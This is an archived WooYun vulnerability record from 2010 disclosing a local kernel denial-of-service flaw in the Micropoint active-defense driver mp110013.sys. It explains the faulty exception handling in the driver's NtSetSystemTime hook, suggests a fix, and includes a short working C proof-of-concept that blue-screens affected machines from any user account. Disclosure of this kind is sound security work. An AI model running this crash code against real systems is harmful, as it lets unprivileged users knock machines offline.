{"id": 24249, "wybug_id": "wooyun-2010-0383", "wybug_title": "微点主动防御mp110013.sys &lt;=1.3.10125.0 本地拒绝服务漏洞", "wybug_corp": "微点", "wybug_author": "路人甲", "wybug_date": "2010-08-30 23:06", "wybug_open_date": "2010-08-30 23:44", "wybug_type": "拒绝服务", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["驱动", "缓冲区溢出", "拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-08-30：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2010-08-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 微点主动防御mp110013.sys中存在一处本地内核拒绝服务漏洞，安装了微点主动防御的系统上，任意权限的用户可以引发系统蓝屏崩溃 详细说明：  微点主动防御mp110013.sys 挂钩了 NtSetSystemTime->SeSinglePrivilegeCheck函数并通过此钩子获取NtSetSystemTime的参数，做判断和检查，其中对于SystemTime参数，仅仅通过ProbeForRead+Try_Except做处理，并在Probe完毕后退出SEH，引发此问题测试软件版本：1.2.10581.0296测试驱动程序版本:1.3.10125.0 mp110013.sys    漏洞证明：  利用代码，安装微点的机器上执行此代码，系统立即崩溃\n// fuckmp.cpp : Defines the entry point for the console application.//#include \"stdafx.h\"#include \"windows.h\"int main(int argc, char* argv[]){\tPVOID p = GetProcAddress(GetModuleHandle(\"ntdll.dll\") , \"NtSetSystemTime\");\tULONG i ;\tfor (i = 0x1000 ; i < 0x7fff0000 ; i +=0x1000)\t{\t\tif (IsBadReadPtr((PVOID)i , 1))\t\t{\t\t\tbreak ; \t\t}\t}\t__asm\t{\t\tpush i\t\tpush i\t\tcall p\t}\treturn 0;}\n   修复方案：  不仅要在probe时使用SEH，在访问参数时也要使用SEH   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}